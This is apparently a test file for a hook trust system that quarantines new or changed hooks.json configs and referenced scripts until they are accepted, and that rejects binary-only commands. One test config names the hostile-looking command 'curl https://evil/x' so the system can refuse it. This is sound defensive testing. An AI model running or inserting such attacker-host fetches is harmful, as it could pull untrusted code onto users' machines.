// New or changed config and referenced scripts stay quarantined until explicit acceptance; binary-only commands cannot load (docs/architecture/hook-runtime-expansion-design.md).
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { cleanupTmpDir } from "../../__tests__/support/tmp-dir-teardown.js";
import {
  loadHookConfig,
  syntheticConfigHook,
  resolveScriptAnchors,
  trustAnchorKey,
  HOOKS_CONFIG_FILENAME,
} from "../hook-config-trust.js";
import { runHookTrustWorkflow } from "../hook-trust-prompt.js";
import { acceptHookTrust, listHookTrustState } from "../hook-trust-commands.js";
import { wireHookSystem } from "../../boot/steps/hook-system-wiring.js";
import { writeJsonConfig, hookDirLayout, type HookDirLayout } from "./test-helpers.js";

let tmpDir: string;
let hooksDir: string;
let disabledDir: string;
let layout: HookDirLayout;
let configPath: string;

beforeEach(() => {
  tmpDir = mkdtempSync(join(tmpdir(), "hook-config-trust-"));
  layout = hookDirLayout(tmpDir);
  ({ hooksDir, disabledDir } = layout);
  configPath = join(hooksDir, HOOKS_CONFIG_FILENAME);
  mkdirSync(hooksDir, { recursive: true });
  writeScript("policy.sh", "#!/bin/sh\nexit 0\n");
});

afterEach(async () => {
  if (tmpDir) await cleanupTmpDir(tmpDir);
});

function writeScript(name: string, body: string): string {
  const p = join(hooksDir, name);
  writeFileSync(p, body);
  chmodSync(p, 0o755);
  return p;
}

const ALLOW_CONFIG = {
  version: 1,
  hooks: {
    PreToolUse: [
      { hooks: [{ type: "command", command: "./policy.sh" }] },
    ],
  },
};

describe("loadHookConfig — composite trust hash", () => {
  it("binds and hashes the script following an absolute environment launcher", () => {
    const launcher = process.platform === "win32" ? writeScript("env.cmd", "fixture launcher") : "/usr/bin/env";
    const script = writeScript("policy.cjs", "module.exports = 'reviewed';");
    writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: [launcher, "node", "./policy.cjs"] }] }] } });
    const reviewed = loadHookConfig(configPath);
    expect(reviewed.errors).toEqual([]);
    expect(reviewed.entries[0].command).toEqual([launcher, "node", script]);
    writeFileSync(script, "module.exports = 'changed';");
    expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
  });

  it("binds and hashes the script following an absolute interpreter", () => {
    const script = writeScript("policy.cjs", "module.exports = 'reviewed';");
    writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: [process.execPath, "./policy.cjs"] }] }] } });
    const reviewed = loadHookConfig(configPath);
    expect(reviewed.errors).toEqual([]);
    expect(reviewed.entries[0].command).toEqual([process.execPath, script]);
    writeFileSync(script, "module.exports = 'changed';");
    expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
  });

  it("binds and hashes both scripts while preserving a slash-containing option", () => {
    const first = writeScript("first.cjs", "first reviewed");
    const second = writeScript("second.cjs", "second reviewed");
    const output = `--output=${join(tmpDir, "result.json")}`;
    const config = (option: string) => ({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: ["node", "./first.cjs", "./second.cjs", option] }] }] } });
    writeJsonConfig(configPath, config(output));
    const reviewed = loadHookConfig(configPath);
    expect(reviewed.errors).toEqual([]);
    expect(reviewed.entries[0].command).toEqual(["node", first, second, output]);
    writeFileSync(first, "first changed");
    expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
    writeFileSync(first, "first reviewed");
    writeFileSync(second, "second changed");
    expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
    writeFileSync(second, "second reviewed");
    writeJsonConfig(configPath, config(`--output=${join(tmpDir, "other.json")}`));
    expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
  });

  it("binds and hashes an additional parent-relative script", () => {
    const first = writeScript("first.cjs", "first reviewed");
    const helper = join(tmpDir, "helper.cjs");
    writeFileSync(helper, "helper reviewed");
    writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{
      type: "command", command: ["node", "./first.cjs", "../helper.cjs"],
    }] }] } });
    const reviewed = loadHookConfig(configPath);
    expect(reviewed.errors).toEqual([]);
    expect(reviewed.entries[0].command).toEqual(["node", first, helper]);
    writeFileSync(helper, "helper changed");
    expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
  });

  it("rejects a command whose operands establish no explicit script anchor", () => {
    writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{
      type: "command", command: ["node", "scripts/policy.cjs"],
    }] }] } });
    const loaded = loadHookConfig(configPath);
    expect(loaded.errors).toContainEqual(expect.stringContaining("requires an absolute, ./ or ../ script anchor"));
    expect(loaded.entries).toEqual([]);
  });

  it.each(["missing", "unreadable"])("rejects a %s script anchor instead of trusting a partial definition", async (failure) => {
    const script = join(hooksDir, "policy.cjs");
    if (failure === "unreadable") mkdirSync(script);
    writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: [process.execPath, "./policy.cjs"] }] }] } });
    const loaded = loadHookConfig(configPath);
    expect(loaded.errors).toContainEqual(expect.stringMatching(/script anchor.*cannot be resolved or read/u));
    expect(loaded.entries).toEqual([]);
    expect((await acceptHookTrust(HOOKS_CONFIG_FILENAME, layout)).ok).toBe(false);
    const boot = await runHookTrustWorkflow({ ...layout, promptDispatcher: {
      prompt: async (diff) => diff.map(({ hook }) => ({ fileName: hook.fileName, trust: true })),
    } });
    expect(boot.trustedHooks).toEqual([]);
    expect(boot.trustedConfigEntries).toEqual([]);
  });

  it("returns exists:false for a missing config (byte-identical to no config)", () => {
    const loaded = loadHookConfig(configPath);
    expect(loaded.exists).toBe(false);
    expect(loaded.entries).toEqual([]);
    expect(loaded.trustHash).toBeNull();
    expect(syntheticConfigHook(loaded)).toBeNull();
  });

  it("hash changes when hooks.json bytes change", () => {
    writeJsonConfig(configPath, ALLOW_CONFIG);
    const h1 = loadHookConfig(configPath).trustHash;
    writeJsonConfig(configPath, { ...ALLOW_CONFIG, version: 2 });
    const h2 = loadHookConfig(configPath).trustHash;
    expect(h1).not.toBeNull();
    expect(h1).not.toBe(h2);
  });

  it("hash changes when a REFERENCED local script changes (composite)", () => {
    writeScript("policy.sh", "#!/bin/sh\necho '{\"action\":\"allow\",\"reason\":\"v1\"}'");
    writeJsonConfig(configPath, {
      version: 1,
      hooks: { PreToolUse: [{ hooks: [{ type: "command", command: join(hooksDir, "policy.sh") }] }] },
    });
    const h1 = loadHookConfig(configPath).trustHash;
    // hooks.json bytes unchanged; only the referenced script changes.
    writeScript("policy.sh", "#!/bin/sh\necho '{\"action\":\"deny\",\"reason\":\"v2-malicious\"}'");
    const h2 = loadHookConfig(configPath).trustHash;
    expect(h1).not.toBe(h2);
  });

  it("binary-only commands are rejected at parse → no runnable entries", () => {
    writeJsonConfig(configPath, {
      version: 1,
      hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "curl https://evil/x" }] }] },
    });
    const loaded = loadHookConfig(configPath);
    expect(loaded.entries).toHaveLength(0);
    expect(loaded.errors.length).toBeGreaterThan(0);
    expect(loaded.errors[0]).toContain("PATH-binary");
  });

  it("resolves every explicit script anchor while leaving ordinary operands alone", () => {
    expect(resolveScriptAnchors(["./a.sh"])).toEqual(["./a.sh"]);
    expect(resolveScriptAnchors(["python3", "./p.py", "../helper.py"])).toEqual(["./p.py", "../helper.py"]);
    expect(resolveScriptAnchors(["curl", "https://x", "data/input.json", "application/json"])).toEqual([]);
  });

  it.each([{ prefix: ["./policy.sh"] }, { prefix: ["sh", "./policy.sh"] }])("binds explicit script anchors in $prefix and preserves ordinary argv", ({ prefix }) => {
    writeScript("policy.sh", "#!/bin/sh\nexit 0\n");
    const ordinary = [`--output=${join(tmpDir, "result.json")}`, "--relative=./reports/out.json", "data/input.json", "application/json", "https://example.com/check"];
    writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: [...prefix, ...ordinary] }] }] } });
    const loaded = loadHookConfig(configPath);
    expect(loaded.errors).toEqual([]);
    expect(loaded.entries[0].command).toEqual([...prefix.slice(0, -1), join(hooksDir, "policy.sh"), ...ordinary]);
  });

  it("does not mistake an option value for the script anchor", () => {
    writeScript("policy.sh", "#!/bin/sh\nexit 0\n");
    const option = `--output=${join(tmpDir, "result.json")}`;
    writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: ["sh", option, "./policy.sh"] }] }] } });
    const loaded = loadHookConfig(configPath);
    expect(loaded.entries[0].command).toEqual(["sh", option, join(hooksDir, "policy.sh")]);
    expect(resolveScriptAnchors(loaded.entries[0].command)).toEqual([join(hooksDir, "policy.sh")]);
    expect(resolveScriptAnchors(["sh", option])).toEqual([]);
  });

  it("requires re-trust when a non-path argument changes", async () => {
    writeScript("policy.sh", "#!/bin/sh\nexit 0\n");
    const config = (mode: string) => ({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: ["./policy.sh", `--mode=${mode}`] }] }] } });
    writeJsonConfig(configPath, config("read"));
    await runHookTrustWorkflow({ ...layout, promptDispatcher: {
      prompt: async (diff) => diff.map(({ hook }) => ({ fileName: hook.fileName, trust: true })),
    } });
    const trustedHash = loadHookConfig(configPath).trustHash;
    writeJsonConfig(configPath, config("write"));
    expect(loadHookConfig(configPath).trustHash).not.toBe(trustedHash);
    expect(listHookTrustState(layout).active).toContainEqual(expect.objectContaining({
      fileName: HOOKS_CONFIG_FILENAME, state: "changed", previousSha256: trustedHash,
    }));
  });
});

describe("hooks.json TOFU diff — quarantine by default", () => {
  it("a NEW hooks.json is quarantined (strict-deny, no dispatcher)", async () => {
    writeJsonConfig(configPath, ALLOW_CONFIG);
    const result = await runHookTrustWorkflow(layout);
    // The synthetic config hook was quarantined; commands never load.
    expect(result.disabledHooks.map((h) => h.fileName)).toContain(HOOKS_CONFIG_FILENAME);
    expect(result.trustedConfigEntries).toEqual([]);
    expect(existsSync(join(disabledDir, HOOKS_CONFIG_FILENAME))).toBe(true);
    expect(existsSync(configPath)).toBe(false);
  });

  it("a trusted (dispatcher-approved) hooks.json loads its command entries", async () => {
    writeJsonConfig(configPath, ALLOW_CONFIG);
    const result = await runHookTrustWorkflow({
      ...layout,
      promptDispatcher: { prompt: async (d) => d.map((x) => ({ fileName: x.hook.fileName, trust: true })) },
    });
    expect(result.trustedHooks.map((h) => h.fileName)).toContain(HOOKS_CONFIG_FILENAME);
    expect(result.trustedConfigEntries).toHaveLength(1);
    expect(result.trustedConfigEntries[0].command).toEqual([join(hooksDir, "policy.sh")]);
    expect(existsSync(configPath)).toBe(true);
  });

  it("a CHANGED hooks.json on a later boot is re-quarantined", async () => {
    writeJsonConfig(configPath, ALLOW_CONFIG);
    await runHookTrustWorkflow({
      ...layout,
      promptDispatcher: { prompt: async (d) => d.map((x) => ({ fileName: x.hook.fileName, trust: true })) },
    });
    writeJsonConfig(configPath, { ...ALLOW_CONFIG, version: 2 });
    // Second boot: strict-deny → re-quarantine, commands stop loading.
    const seen: string[] = [];
    const result = await runHookTrustWorkflow({
      ...layout,
      promptDispatcher: {
        prompt: async (d) => {
          for (const x of d) seen.push(`${x.state}:${x.hook.fileName}`);
          return d.map((x) => ({ fileName: x.hook.fileName, trust: false }));
        },
      },
    });
    expect(seen).toContain(`changed:${HOOKS_CONFIG_FILENAME}`);
    expect(result.disabledHooks.map((h) => h.fileName)).toContain(HOOKS_CONFIG_FILENAME);
    expect(result.trustedConfigEntries).toEqual([]);
  });
});

describe("hooks.json /permission hooks accept restores + loads", () => {
  it("accept restores a quarantined hooks.json and the manager loads its entries", async () => {
    writeJsonConfig(configPath, ALLOW_CONFIG);
    const boot = await wireHookSystem(layout);
    expect(boot.manager.size()).toBe(0);
    expect(existsSync(join(disabledDir, HOOKS_CONFIG_FILENAME))).toBe(true);

    const accepted = await acceptHookTrust(HOOKS_CONFIG_FILENAME, {
      ...layout,
      manager: boot.manager,
    });
    expect(accepted).toMatchObject({ ok: true, verb: "accept" });
    // hooks.json restored to the active dir AND its command entry now loads.
    expect(existsSync(configPath)).toBe(true);
    expect(boot.manager.size()).toBe(1);

    const listed = listHookTrustState(layout);
    const configRow = listed.active.find((r) => r.fileName === HOOKS_CONFIG_FILENAME);
    expect(configRow?.state).toBe("trusted");
    expect(configRow?.source).toBe("config");
    expect(configRow?.entryCount).toBe(1);
    expect(configRow?.entries?.[0]).toMatchObject({ event: "pre", command: join(hooksDir, "policy.sh") });
  });

  it("accept rejects an identity that is not the exact config literal (no traversal)", async () => {
    await expect(
      acceptHookTrust("../hooks.json", layout),
    ).resolves.toMatchObject({ ok: false });
    await expect(
      acceptHookTrust("hooks.json.bak", layout),
    ).resolves.toMatchObject({ ok: false });
  });
});

describe("trustAnchorKey", () => {
  it("folds the same script identically whichever separator spelled its path", () => {
    expect(trustAnchorKey("C:\\Users\\me\\hooks\\run.sh")).toBe(trustAnchorKey("C:/Users/me/hooks/run.sh"));
    expect(trustAnchorKey("/home/me/hooks/run.sh")).toBe("/home/me/hooks/run.sh");
  });
});
